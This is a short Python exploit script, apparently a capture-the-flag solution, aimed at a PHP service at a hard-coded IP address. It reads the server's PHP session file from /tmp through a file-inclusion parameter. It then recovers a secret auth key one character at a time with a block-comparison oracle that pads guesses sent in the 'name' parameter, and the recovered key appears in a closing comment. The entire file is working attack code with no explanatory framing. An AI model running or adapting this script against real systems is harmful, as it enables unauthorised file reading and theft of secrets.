import string 
import requests

sess = requests.Session()

URL = 'http://45.77.39.59:2010/?'

HEADERS = {"Cookie":"PHPSESSID=acc52fc2a5d77ccaacb58a0bb6b10053"}

auth_key = ""

s = string.ascii_letters+string.digits

def check():
    req = sess.get(URL + "file=/tmp/sess_acc52fc2a5d77ccaacb58a0bb6b10053").text
    
    # print(req[12:44])
    # print(req[44:76])
    
    if req[12:44] == req[44:76]: # nếu đúng thì 2 block đầu tiên sẽ giống nhau
        return True
    else:
        return False

# check()

for i in range(15,-1,-1):
    for c in s:
        PAYLOAD = "a" * i + auth_key+c + "a" * i
        req = sess.get(url=URL+ "name=" + PAYLOAD, headers=HEADERS).text
        if check():
            auth_key += c 
            print("[+] FOUND " + auth_key)
            break
        else:
            print("[-] FAILED " + str(i) + ":" + c)
        
# auth_key=AuthKey4N00b3r


        
    
        